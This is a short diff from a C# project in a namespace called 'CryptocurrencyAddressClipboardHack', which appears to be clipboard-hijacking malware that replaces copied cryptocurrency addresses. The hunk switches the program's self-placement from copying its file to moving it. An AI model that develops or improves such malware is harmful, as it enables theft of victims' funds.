@@ -118,7 +118,7 @@ namespace CryptocurrencyAddressClipboardHack
 
             if (!File.Exists(fullPathDestiny))
             {
-                File.Copy(originPath, fullPathDestiny);
+                File.Move(originPath, fullPathDestiny);//depending on the scenario it is convenient to use "Copy"
             }
         }
 
